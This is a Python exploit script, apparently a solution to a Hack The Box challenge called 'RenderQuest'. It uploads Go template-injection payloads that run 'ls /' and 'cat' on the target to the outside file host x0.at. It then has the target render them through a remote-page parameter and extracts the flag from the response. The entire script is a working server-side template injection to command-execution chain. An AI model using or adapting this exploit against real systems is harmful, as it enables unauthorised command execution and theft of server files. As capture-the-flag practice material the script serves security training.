import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 RenderQuest.py ip:port")
    sys.exit(1)

host = sys.argv[1]
host_ip, port = host.split(":")
url = f"http://{host_ip}:{port}"
file_host = "https://x0.at"

def upload_payload(payload):
    response = requests.post(file_host, files={"file": payload})
    if response.status_code != 200:
        print(" Failed to upload payload")
        sys.exit(1)
    return response.text.strip()

def extract_flag_name(listing):
    match = re.search(r"flag[\w\-]*\.txt", listing)
    if match:
        return match.group(0)
    print("Flag file not found in listing.")
    sys.exit(1)

ls_payload = '{{ .FetchServerInfo "ls /" }}'
ls_file_url = upload_payload(ls_payload)
response = requests.get(f"{url}/render?use_remote=true&page={ls_file_url}")
if response.status_code != 200:
    print(" Failed to render payload")
    sys.exit(1)

flag_file = extract_flag_name(response.text)

cat_payload = f'{{{{ .FetchServerInfo "cat /{flag_file}" }}}}'
cat_file_url = upload_payload(cat_payload)

response = requests.get(f"{url}/render?use_remote=true&page={cat_file_url}")
if response.status_code != 200:
    print("Failed to render payload")
    sys.exit(1)

flag = re.search(r"HTB\{.*?\}", response.text)
if flag:
    print("Flag found:", flag.group(0))
else:
    print("Flag not found in response.")
